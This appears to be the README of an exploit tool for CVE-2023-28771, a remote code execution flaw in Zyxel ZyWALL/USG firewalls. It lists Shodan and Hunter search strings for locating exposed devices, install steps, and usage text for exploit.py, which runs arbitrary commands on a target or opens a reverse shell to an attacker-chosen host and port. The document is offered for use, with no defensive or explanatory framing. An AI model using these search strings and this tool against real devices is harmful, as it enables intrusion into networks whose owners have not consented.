# CVE-2023-28771
Zyxel ZyWALL/USG Remote Code Execution.

- Shodan dork:
```
/ext-js/app/common/zld_product_spec.js
```
- [Hunter](https://hunter.how) dork:
```
web.body="/ext-js/app/common/zld_product_spec.js"
```


## Install
Requires the scapy Python library for sending IKE packets.

```
pip install -r requirements.txt

```
usage: exploit.py [-h] [--cmd CMD] [--lhost LHOST] [--lport LPORT] rhost

positional arguments:
  rhost

options:
  -h, --help     show this help message and exit
  --cmd CMD
  --lhost LHOST
  --lport LPORT
```

Either use --cmd to run an arbitrary command, or use --lport and --lhost to spawn a revshell
